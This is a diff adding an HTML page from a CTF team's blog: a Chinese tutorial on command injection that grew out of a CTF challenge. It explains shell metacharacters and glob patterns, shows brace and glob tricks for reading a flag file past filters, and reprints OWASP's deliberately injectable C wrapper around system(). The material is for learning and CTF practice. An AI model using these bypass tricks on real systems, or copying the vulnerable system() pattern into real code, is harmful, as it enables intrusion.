@@ -1,0 +1,1082 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>巧用命令注入的N种方式 | Asuri Team</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="​    本文首发于补天平台，地址：https:&#x2F;&#x2F;mp.weixin.qq.com&#x2F;s&#x2F;Hm6TiLHiAygrJr-MGRq9Mw  在NUAACTF_2018中，我出了一道比较水的采用Spring框架的SSRF+Java Deserialization+Command Injection。个人觉得在出题时候也学习到了不少知识，特别是在Command Injection这一块让我对Comma">
+<meta property="og:type" content="article">
+<meta property="og:title" content="巧用命令注入的N种方式">
+<meta property="og:url" content="http://asuri.org/2019/01/17/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/index.html">
+<meta property="og:site_name" content="Asuri Team">
+<meta property="og:description" content="​    本文首发于补天平台，地址：https:&#x2F;&#x2F;mp.weixin.qq.com&#x2F;s&#x2F;Hm6TiLHiAygrJr-MGRq9Mw  在NUAACTF_2018中，我出了一道比较水的采用Spring框架的SSRF+Java Deserialization+Command Injection。个人觉得在出题时候也学习到了不少知识，特别是在Command Injection这一块让我对Comma">
+<meta property="og:locale">
+<meta property="og:image" content="https://ws1.sinaimg.cn/large/64ef14dcgy1fykpgyazsuj213i0x6491.jpg">
+<meta property="og:image" content="https://ws1.sinaimg.cn/large/64ef14dcgy1fykpgyazsuj213i0x6491.jpg">
+<meta property="og:image" content="https://ws1.sinaimg.cn/large/64ef14dcgy1fykptasckdj21yw18saov.jpg">
+<meta property="og:image" content="https://ws1.sinaimg.cn/large/64ef14dcgy1fylfbbt1n2j21yy1964ki.jpg">
+<meta property="og:image" content="https://ws1.sinaimg.cn/large/64ef14dcgy1fylhtmzibwj210w0lynmy.jpg">
+<meta property="og:image" content="https://ws1.sinaimg.cn/large/64ef14dcgy1fylohigzelj20di03udhe.jpg">
+<meta property="og:image" content="https://ws1.sinaimg.cn/large/64ef14dcgy1fylpd2xpc2j20f609yafw.jpg">
+<meta property="og:image" content="https://ws1.sinaimg.cn/large/64ef14dcgy1fylp50us2bj20fq0bwdm1.jpg">
+<meta property="og:image" content="https://ws1.sinaimg.cn/large/64ef14dcgy1fymd36mystj20ey0fcjz2.jpg">
+<meta property="og:image" content="https://ws1.sinaimg.cn/large/64ef14dcgy1fymhdhrmuuj20rk0jy1eq.jpg">
+<meta property="og:image" content="https://ws1.sinaimg.cn/large/64ef14dcgy1fymhg7vu7pj20rm0hkngg.jpg">
+<meta property="og:image" content="https://ws1.sinaimg.cn/large/64ef14dcgy1fymhz9q2loj21320h0qtd.jpg">
+<meta property="og:image" content="https://ws1.sinaimg.cn/large/64ef14dcgy1fymi5dskw0j20j209ujzs.jpg">
+<meta property="og:image" content="https://ws1.sinaimg.cn/large/64ef14dcgy1fymmfc648jj218e0cswgu.jpg">
+<meta property="og:image" content="https://ws1.sinaimg.cn/large/64ef14dcgy1fymxkbytn4j20pg0h41cd.jpg">
+<meta property="og:image" content="https://ws1.sinaimg.cn/large/64ef14dcgy1fymyefg60qj217e03qqcv.jpg">
+<meta property="og:image" content="https://ws1.sinaimg.cn/large/64ef14dcgy1fymyeptgv0j21ro076ab3.jpg">
+<meta property="og:image" content="https://ws1.sinaimg.cn/large/64ef14dcgy1fynlyqbpj2j20ti048ahj.jpg">
+<meta property="og:image" content="https://ws1.sinaimg.cn/large/64ef14dcgy1fynlyxejhmj20le0esh2i.jpg">
+<meta property="og:image" content="https://ws1.sinaimg.cn/large/64ef14dcgy1fymz6ztna0j20lw0au10p.jpg">
+<meta property="og:image" content="https://ws1.sinaimg.cn/large/64ef14dcgy1fymz73833rj210w05gn41.jpg">
+<meta property="article:published_time" content="2019-01-17T10:55:27.000Z">
+<meta property="article:modified_time" content="2023-04-07T12:29:53.470Z">
+<meta property="article:author" content="All Members">
+<meta property="article:tag" content="RCE">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://ws1.sinaimg.cn/large/64ef14dcgy1fykpgyazsuj213i0x6491.jpg">
+  
+    <link rel="alternate" href="/atom.xml" title="Asuri Team" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  
+    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+
+<meta name="generator" content="Hexo 5.2.0"></head>
+
+
+<body>
+  <div id="container">
+    
+
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">Asuri Team</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+          <a class="main-nav-link" href="/members">Members</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
+        
+        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://asuri.org"></form>
+      </div>
+    </div>
+  </div>
+</header>
+      <div class="outer">
+        <section id="main"><article id="post-命令执行" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2019/01/17/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" class="article-date">
+  <time datetime="2019-01-17T10:55:27.000Z" itemprop="datePublished">2019-01-17</time>
+</a>
+    
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/Web-%E5%AE%89%E5%85%A8/">Web 安全</a>
+  </div>
+
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      巧用命令注入的N种方式
+    </h1>
+  
+
+
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <blockquote>
+<p>​    本文首发于补天平台，地址：<a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/Hm6TiLHiAygrJr-MGRq9Mw">https://mp.weixin.qq.com/s/Hm6TiLHiAygrJr-MGRq9Mw</a></p>
+</blockquote>
+<p>在<code>NUAACTF_2018</code>中，我出了一道比较水的采用<code>Spring</code>框架的<code>SSRF</code>+<code>Java Deserialization</code>+<code>Command Injection</code>。个人觉得在出题时候也学习到了不少知识，特别是在<code>Command Injection</code>这一块让我对<code>Command Injection</code>有了新的看法。</p>
+<a id="more"></a>
+
+<p>[TOC]</p>
+<h2 id="命令注入"><a href="#命令注入" class="headerlink" title="命令注入"></a>命令注入</h2><h3 id="理论基础"><a href="#理论基础" class="headerlink" title="理论基础"></a>理论基础</h3><blockquote>
+<p>Command injection is an attack in which the goal is execution of arbitrary commands on the host operating system via a vulnerable application. Command injection attacks are possible when an application passes unsafe user supplied data (forms, cookies, HTTP headers etc.) to a system shell. In this attack, the attacker-supplied operating system commands are usually executed with the privileges of the vulnerable application. Command injection attacks are possible largely due to insufficient input validation.</p>
+<p>This attack differs from <a target="_blank" rel="noopener" href="https://www.owasp.org/index.php/Code_Injection">Code Injection</a>, in that code injection allows the attacker to add his own code that is then executed by the application. In Command Injection, the attacker extends the default functionality of the application, which execute system commands, without the necessity of injecting code.</p>
+</blockquote>
+<p>以上来自<a target="_blank" rel="noopener" href="https://www.owasp.org/index.php/Command_Injection">Command Injection - OWASP</a>，翻译过来就是通过易受攻击的应用程序在主机操作系统上执行任意命令。当应用程序将不安全的用户提供的数据（表单，cookie，HTTP标头等）传递给系统shell时，可能会发生命令注入攻击。 在此攻击中，攻击者提供的操作系统命令通常以易受攻击的应用程序的权限执行。 命令注入攻击很可能主要是由于输入验证不足。此攻击与代码注入不同，因为代码注入允许攻击者添加自己的代码，然后由应用程序执行。 在命令注入中，攻击者扩展了执行系统命令的应用程序的默认功能，而无需注入代码。</p>
+<blockquote>
+<p>​    命令注入攻击最初被称为Shell命令注入攻击，是由挪威一名程序员在1997年意外发现的。第一个命令注入攻击程序能随意地从一个网站删除网页，就像从磁盘或者硬盘移除文件一样简单。        ——百度百科</p>
+</blockquote>
+<h3 id="特殊符号"><a href="#特殊符号" class="headerlink" title="特殊符号"></a>特殊符号</h3><p>讲到命令注入，就不得不提到特殊符号的运用。例如上面例子中的<code>|</code>管道符，还有比较多的类似有奇效的符号组合。</p>
+<h4 id><a href="#" class="headerlink" title="|"></a>|</h4><p>连结上个指令的标准输出，做为下个指令的标准输入。</p>
+<h4 id="amp"><a href="#amp" class="headerlink" title="&amp;"></a>&amp;</h4><p>用户有时候执行命令要花很长时间，可能会影响做其他事情。最好的方法是将它放在后台执行。后台运行的程序在用户注销后系统还可以继续执行。当要把命令放在后台执行时，在命令的后面加上<code>&amp;</code>。</p>
+<h4 id="Linux中的-amp-amp-与"><a href="#Linux中的-amp-amp-与" class="headerlink" title="Linux中的&amp;&amp;与||"></a>Linux中的&amp;&amp;与||</h4><p><code>shell</code>在执行某个命令的时候，会返回一个返回值，该返回值保存在<code>shell</code>变量 <code>$?</code> 中。当 <code>$? == 0</code> 时，表示执行成功；当 <code>$? == 1</code> 时，表示执行失败。有时候，下一条命令依赖前一条命令是否执行成功。如：在成功地执行一条命令之后再执行另一条命令，或者在一条命令执行失败后再执行另一条命令等。<code>shell</code>提供了<code>&amp;&amp;</code>和<code>||</code>来实现命令执行控制的功能，<code>shell</code>将根据<code>&amp;&amp;</code>或<code>||</code>前面命令的返回值来控制其后面命令的执行。  </p>
+<h4 id="amp-amp"><a href="#amp-amp" class="headerlink" title="&amp;&amp;"></a>&amp;&amp;</h4><p>语法格式如下：</p>
+<pre><code>command1 &amp;&amp; command2 [&amp;&amp; command3 ...]  </code></pre>
+<ul>
+<li><p>命令之间使用 &amp;&amp; 连接，实现逻辑与的功能。  </p>
+</li>
+<li><p>只有在<code>&amp;&amp;</code>左边的命令返回真（命令返回值 <code>$? == 0</code>），<code>&amp;&amp;</code>右边的命令才会被执行</p>
+</li>
+<li><p>只要有一个命令返回假（命令返回值 <code>$? == 1</code>），后面的命令就不会被执行</p>
+</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ cp ~/Desktop/1.txt ~/1.txt &amp;&amp; rm ~/Desktop/1.txt &amp;&amp; <span class="built_in">echo</span> <span class="string">&quot;success&quot;</span>  </span><br></pre></td></tr></table></figure>
+
+<p>示例 中的命令首先从<code>~/Desktop</code>目录复制 <code>1.txt</code>文件到<code>~</code>目录；执行成功后，使用<code>rm</code>删除源文件；如果删除成功则输出提示信息。</p>
+<h4 id="-1"><a href="#-1" class="headerlink" title="||"></a>||</h4><p>语法格式如下：  </p>
+<pre><code>command1 || command2 [|| command3 ...]  </code></pre>
+<ul>
+<li><p>命令之间使用 || 连接，实现逻辑或的功能。</p>
+</li>
+<li><p>只有在 || 左边的命令返回假（命令返回值 <code>$? == 1</code>），<code>||</code>右边的命令才会被执行。这和<code>c</code>语言中的逻辑或语法功能相同，即实现短路逻辑或操作。</p>
+</li>
+<li><p>只要有一个命令返回真（命令返回值 <code>$? == 0</code>），后面的命令就不会被执行。  </p>
+</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ rm ~/Desktop/1.txt || <span class="built_in">echo</span> <span class="string">&quot;fail&quot;</span>  </span><br></pre></td></tr></table></figure>
+
+<p>如果 ~/Desktop 目录下不存在文件 1.txt，将输出提示信息。  </p>
+<h4 id="分号"><a href="#分号" class="headerlink" title=";分号"></a>;分号</h4><p>当有几个命令要连续执行时，我们可以把它们放在一行内，中间用<code>;</code>分开。</p>
+<h4 id="反引号（重音符）"><a href="#反引号（重音符）" class="headerlink" title="`反引号（重音符）"></a>`反引号（重音符）</h4><p>命令替代，大部分<code>Unix shell</code>以及编程语言如<code>Perl</code>、<code>PHP</code>以及<code>Ruby</code>等都以成对的重音符(反引号)作指令替代，意思是以某一个指令的输出结果作为另一个指令的输入项。例如以下指令:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> It is now `date` </span><br><span class="line"></span><br><span class="line">等价于：</span><br><span class="line"><span class="built_in">echo</span> It is now 一 12月 17 12:16:04 GMT 2018</span><br><span class="line"></span><br><span class="line">在正式执行时会产生以下输出结果：</span><br><span class="line">It is now 一 12月 17 12:16:04 GMT 2018</span><br></pre></td></tr></table></figure>
+
+<h4 id="‘单引号"><a href="#‘单引号" class="headerlink" title="‘单引号"></a>‘单引号</h4><p>被单引号括住的内容,将被视为单一字符串。在引号内的变量<code>$</code>符号将会失效，也就是说，将被视作一般符号处理。</p>
+<h4 id="“双引号"><a href="#“双引号" class="headerlink" title="“双引号"></a>“双引号</h4><p>被双引号括住的内容，将被视为单一字符串，防止通配符的扩展，但允许变量扩展 ，这点与单引号的处理方式不同</p>
+<h4 id="指令群组"><a href="#指令群组" class="headerlink" title="()指令群组"></a>()指令群组</h4><p>格式为：(command1;command2[;command3…])</p>
+<ul>
+<li>一条命令需要独占一个物理行，如果需要将多条命令放在同一行，命令之间使用命令分隔符（;）分隔。执行的效果等同于多个独立的命令单独执行的效果。</li>
+<li>表示在当前 shell 中将多个命令作为一个整体执行。需要注意的是，使用 () 括起来的命令在执行前面都不会切换当前工作目录，也就是说命令组合都是在当前工作目录下被执行的，尽管命令中有切换目录的命令。</li>
+<li>命令组合常和命令执行控制结合起来使用。  </li>
+</ul>
+<p>用括号将一串连续指令括起来，这种用法对<code>shell</code>来说，称为指令群组。如下面的例子:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(<span class="built_in">cd</span> ~ ; vcgh=`<span class="built_in">pwd</span>` ;<span class="built_in">echo</span> <span class="variable">$vcgh</span>)</span><br></pre></td></tr></table></figure>
+
+<p>指令群组有一个特性，shell会以产生<code>subshell</code>来执行这组指令。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ rm ~/Desktop/1.txt || (<span class="built_in">cd</span> ~/Desktop/;ls -a;<span class="built_in">echo</span> <span class="string">&quot;fail&quot;</span>)  </span><br><span class="line"></span><br><span class="line">如果目录 ~/Desktop 下不存在文件 1.txt，则执行命令组合。 </span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="-2"><a href="#-2" class="headerlink" title="(())"></a>(())</h4><p>这组符号的作用与 let 指令相似，用在算数运算上，是 bash 的内建功能。所以，在执行效率上会比使用 let指令要好许多。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash(( a = 10 ))echo -e &quot;inital value, a = $a\n&quot;(( a++))echo &quot;after a++, a = $a&quot;</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="大括号"><a href="#大括号" class="headerlink" title="{}大括号"></a>{}大括号</h4><p>其实大括号有一种拼接字符串的用法，<code>&#123;xx,yy,zz,...&#125;</code>这种大括号的组合，常用在字串的组合上，来看个例子</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mkdir &#123;userA,userB,userC&#125;-&#123;home,bin,data&#125;</span><br></pre></td></tr></table></figure>
+
+<p>我们得到<code>userA-home, userA-bin, userA-data, userB-home, userB-bin,userB-data, userC-home, userC-bin,userC-data</code>。于是我们可以有</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ cat &#123;/fl,/fla&#125;&#123;ag,g&#125;</span><br><span class="line">flag&#123;xxx&#125;</span><br><span class="line">cat: /flg: No such file or directory</span><br><span class="line">cat: /flaag: No such file or directory</span><br><span class="line">flag&#123;xxx&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="中括号"><a href="#中括号" class="headerlink" title="[]中括号"></a>[]中括号</h4><p>常出现在流程控制中，扮演括住判断式的作用。<code>if [ &quot;$?&quot; != 0 ]thenecho &quot;Executes error&quot;exit1fi</code>。这个符号在正则表达式中担任类似 “范围” 或 “集合” 的角色。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ cat /fl[0-z]g</span><br><span class="line">flag&#123;xxx&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="-3"><a href="#-3" class="headerlink" title="[[ ]]"></a>[[ ]]</h4><p>这组符号与先前的<code> []</code> 符号，基本上作用相同，但她允许在其中直接使用<code>||</code>与<code>&amp;&amp;</code>逻辑等符号。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bashread akif [[ $ak &gt; 5 || $ak&lt; 9 ]]thenecho $akfi</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="小括号，中括号，和大括号的区别"><a href="#小括号，中括号，和大括号的区别" class="headerlink" title="小括号，中括号，和大括号的区别"></a>小括号，中括号，和大括号的区别</h4><p>那么，下面又涉及到了一个问题，就是小括号，中括号，和大括号的区别。</p>
+<ol>
+<li>单小括号，(cmd1;cmd2;cmd3) 新开一个子shell顺序执行命令cmd1,cmd2,cmd3, 各命令之间用分号隔开, 最后一个命令后可以没有分号。把<code>command group</code>放在<code>subshell</code>去执行，也叫做<code>nested sub-shell</code>。</li>
+<li>单大括号，{ cmd1;cmd2;cmd3;} 在当前shell顺序执行命令cmd1,cmd2,cmd3, 各命令之间用分号隔开, 最后一个命令后必须有分号, 第一条命令和左括号之间必须用空格隔开。花括号是在同一个 shell 內完成，也称为 <code>non-namedcommand group</code>。</li>
+</ol>
+<p>所以说，如果在shell里面执行“函数”，需要用到{}，实际上也就是一个命令群组么。<br>不过，根据实测，<code>test=$(ls -a)</code>可以执行，但是<code>test=$&#123;ls–a&#125;</code>语法上面是有错误的。估计也和上面所说的原因有关。</p>
+<p>另外，从网上摘录的区别如下：</p>
+<ul>
+<li><p>()只是对一串命令重新开一个子shell进行执行</p>
+</li>
+<li><p>{}对一串命令在当前shell执行</p>
+</li>
+<li><p>()和{}都是把一串的命令放在括号里面，并且命令之间用;号隔开</p>
+</li>
+<li><p>()最后一个命令可以不用分号</p>
+</li>
+<li><p>{}最后一个命令要用分号</p>
+</li>
+<li><p>{}的第一个命令和左括号之间必须要有一个空格</p>
+</li>
+<li><p>()里的各命令不必和括号有空格</p>
+</li>
+<li><p>()和{}中括号里面的某个命令的重定向只影响该命令，但括号外的重定向则影响到括号里的所有命令</p>
+</li>
+</ul>
+<p>这里引出来<code>[..]</code>和<code>[[...]]</code>的区别：使用<code>[[...]]</code>条件判断结构, 而不是<code>[...]</code>, 能够防止脚本中的许多逻辑错误.比如<code>&amp;&amp;</code>,<code> ||</code>,<code>&lt;</code>,和<code>&gt;</code> 操作符能够正常存在于<code>[[ ]]</code>条件判断结构中, 但是如果出现在<code>[]</code>结构中的话，会报错。</p>
+<p>对<code>&#123;&#125;</code>和<code>()</code>而言, 括号中的重定向符只影响该条命令， 而括号外的重定向符影响到括号中的所有命令。</p>
+<h4 id="输入输出-重定向"><a href="#输入输出-重定向" class="headerlink" title="输入输出/重定向"></a>输入输出/重定向</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt;      &gt;&gt;   &lt;   &lt;&lt;   :&gt;   &amp;&gt;   2&amp;&gt;   2&lt;&gt;&gt;&amp;   &gt;&amp;2</span><br></pre></td></tr></table></figure>
+
+<p>文件描述符(File Descriptor)，用一个数字（通常为0-9）来表示一个文件。</p>
+<table>
+<thead>
+<tr>
+<th>文件描述符</th>
+<th>名称</th>
+<th>常用缩写</th>
+<th>默认值</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>0</td>
+<td>标准输入</td>
+<td>stdin</td>
+<td>键盘</td>
+</tr>
+<tr>
+<td>1</td>
+<td>标准输出</td>
+<td>stdout</td>
+<td>屏幕</td>
+</tr>
+<tr>
+<td>2</td>
+<td>标准错误输出</td>
+<td>stderr</td>
+<td>屏幕</td>
+</tr>
+</tbody></table>
+<p>我们在简单地用<code>&lt;</code>或<code>&gt;</code>时，相当于使用<code>0&lt;</code>或<code>1&gt;</code>（下面会详细介绍）。</p>
+<ul>
+<li><p>cmd &gt; file<br>把cmd命令的输出重定向到文件file中。如果file已经存在，则清空原有文件，使用bash的noclobber选项可以防止复盖原有文件。</p>
+</li>
+<li><p>cmd &gt;&gt; file<br>把cmd命令的输出重定向到文件file中，如果file已经存在，则把信息加在原有文件后面。</p>
+</li>
+<li><p>cmd &lt; file<br>使cmd命令从file读入</p>
+</li>
+<li><p>cmd &lt;&lt; text<br>从命令行读取输入，直到一个与text相同的行结束。除非使用引号把输入括起来，此模式将对输入内容进行shell变量替换。如果使用<code>&lt;&lt;-</code> ，则会忽略接下来输入行首的tab，结束行也可以是一堆tab再加上一个与text相同的内容，可以参考後面的例子。</p>
+</li>
+<li><p>cmd &lt;&lt;&lt; word<br>把word（而不是文件word）和后面的换行作为输入提供给cmd。</p>
+</li>
+<li><p>cmd &lt;&gt; file<br>以读写模式把文件file重定向到输入，文件file不会被破坏。仅当应用程序利用了这一特性时，它才是有意义的。</p>
+</li>
+<li><p>cmd &gt;| file<br>功能同&gt;，但即便在设置了noclobber时也会复盖file文件，注意用的是|而非一些书中说的!，目前仅在csh中仍沿用<code>&gt;!</code>实现这一功能。</p>
+</li>
+<li><p>: &gt; filename</p>
+<p>把文件<code>filename</code>截断为0长度。如果文件不存在, 那么就创建一个0长度的文件(与<code>touch</code>的效果相同).</p>
+</li>
+<li><p>cmd &gt;&amp;n </p>
+<p>把输出送到文件描述符n</p>
+</li>
+<li><p>cmd m&gt;&amp;n </p>
+<p>把输出到文件符m的信息重定向到文件描述符n</p>
+</li>
+<li><p>cmd &gt;&amp;- </p>
+<p>关闭标准输出</p>
+</li>
+<li><p>cmd &lt;&amp;n </p>
+<p>输入来自文件描述符n</p>
+</li>
+<li><p>cmd m&lt;&amp;n</p>
+<p>m来自文件描述各个n</p>
+</li>
+<li><p>cmd &lt;&amp;-</p>
+<p>关闭标准输入</p>
+</li>
+<li><p>cmd &lt;&amp;n-</p>
+<p>移动输入文件描述符n而非复制它。</p>
+</li>
+<li><p>cmd &gt;&amp;n-</p>
+<p>移动输出文件描述符n而非复制它。<br>注意： <code>&gt;&amp;</code>实际上复制了文件描述符，这使得<code>cmd &gt; file 2&gt;&amp;1</code>与<code>cmd 2&gt;&amp;1 &gt;file</code>的效果不一样。</p>
+</li>
+</ul>
+<h3 id="通配符"><a href="#通配符" class="headerlink" title="通配符"></a>通配符</h3><p>还有一类通配符，首先先了解下什么是Linux shell通配符/glob模式:</p>
+<blockquote>
+<p>glob 模式（globbing）也被称之为 shell 通配符，名字的起源来自于 Unix V6 中的 <code>/etc/glob</code> （详见 man 文档）。glob 是一种特殊的模式匹配，最常见的是通配符拓展，也可以将 glob 模式设为精简了的正则表达式，在最新的 CentOS 7 中已经删除了 glob 的相关描述文档，删除的原因由于 glob 已经整合到了 shell 之中，然后就有了 shell 通配符。<strong>shell 通配符 / glob 模式通常用来匹配目录以及文件，而不是文本！！！</strong></p>
+</blockquote>
+<h4 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h4><table>
+<thead>
+<tr>
+<th>字符</th>
+<th>解释</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>*</td>
+<td>匹配任意长度任意字符</td>
+</tr>
+<tr>
+<td>?</td>
+<td>匹配任意单个字符</td>
+</tr>
+<tr>
+<td>[list]</td>
+<td>匹配指定范围内（list）任意单个字符，也可以是单个字符组成的集合</td>
+</tr>
+<tr>
+<td>[^list]</td>
+<td>匹配指定范围外的任意单个字符或字符集合</td>
+</tr>
+<tr>
+<td>[!list]</td>
+<td>同<code>[^list]</code></td>
+</tr>
+<tr>
+<td>{str1,str2,…}</td>
+<td>匹配 srt1 或者 srt2 或者更多字符串，也可以是集合</td>
+</tr>
+<tr>
+<td>IFS</td>
+<td>由 &lt; space &gt; 或 &lt; tab &gt; 或 &lt; enter &gt; 三者之一组成</td>
+</tr>
+<tr>
+<td>CR</td>
+<td>由 &lt; enter &gt; 产生</td>
+</tr>
+<tr>
+<td>!</td>
+<td>执行 history 中的命令</td>
+</tr>
+</tbody></table>
+<p>以及还有专用字符集</p>
+<table>
+<thead>
+<tr>
+<th>字符</th>
+<th>意义</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>[:alnum:]</td>
+<td>任意数字或者字母</td>
+</tr>
+<tr>
+<td>[:alpha:]</td>
+<td>任意字母</td>
+</tr>
+<tr>
+<td>[:space:]</td>
+<td>空格</td>
+</tr>
+<tr>
+<td>[:lower:]</td>
+<td>小写字母</td>
+</tr>
+<tr>
+<td>[:digit:]</td>
+<td>任意数字</td>
+</tr>
+<tr>
+<td>[:upper:]</td>
+<td>任意大写字母</td>
+</tr>
+<tr>
+<td>[:cntrl:]</td>
+<td>控制符</td>
+</tr>
+<tr>
+<td>[:graph:]</td>
+<td>图形</td>
+</tr>
+<tr>
+<td>[:print:]</td>
+<td>可打印字符</td>
+</tr>
+<tr>
+<td>[:punct:]</td>
+<td>标点符号</td>
+</tr>
+<tr>
+<td>[:xdigit:]</td>
+<td>十六进制数</td>
+</tr>
+<tr>
+<td>[:blank:]</td>
+<td>空白字符</td>
+</tr>
+</tbody></table>
+<ul>
+<li>在使用专属字符集的时候，字符集之外还需要用 [ ] 来包含住，否则专用字符集不会生效，例如<code>[[:space:]]</code></li>
+<li>想要转义的时候，单引号与双引号使用方法是不同的，单引号会转义所有字符，而且单引号中间不允许再出现单引号，双引号允许出现特定的 shell 元字符，具体字符可以自行查询</li>
+<li>在使用花括号 {} 的时候，里面的单个字符串需要使用单引号或者双引号括住，否则就会视为多个的单个字符</li>
+</ul>
+<h3 id="举个🌰"><a href="#举个🌰" class="headerlink" title="举个🌰"></a>举个🌰</h3><p>以下事例Example 1-6来源于<code>OWASP</code></p>
+<h4 id="Example-1"><a href="#Example-1" class="headerlink" title="Example 1"></a>Example 1</h4><p>以下代码是UNIX命令<code>cat</code>的包装器，它将文件的内容打印到标准输出。 它也是可以被注入的：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span> cat[] = <span class="string">&quot;cat &quot;</span>;</span><br><span class="line">    <span class="keyword">char</span> *command;</span><br><span class="line">    <span class="keyword">size_t</span> commandLength;</span><br><span class="line"></span><br><span class="line">    commandLength = <span class="built_in">strlen</span>(cat) + <span class="built_in">strlen</span>(argv[<span class="number">1</span>]) + <span class="number">1</span>;</span><br><span class="line">    command = (<span class="keyword">char</span> *) <span class="built_in">malloc</span>(commandLength);</span><br><span class="line">    <span class="built_in">strncpy</span>(command, cat, commandLength);</span><br><span class="line">    <span class="built_in">strncat</span>(command, argv[<span class="number">1</span>], (commandLength - <span class="built_in">strlen</span>(cat)) );</span><br><span class="line"></span><br><span class="line">    system(command);</span><br><span class="line">    <span class="keyword">return</span> (<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>我们编译完之后可以通过以下操作正常使用</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ ./catWrapper Story.txt</span><br><span class="line">When last we left our heroes...</span><br></pre></td></tr></table></figure>
+
+<p>但是，如果我们在这行的末尾之后加一个<code>;</code>和另一个命令，那么命令<code>catWrapper</code>执行而且也不会出错。</p>
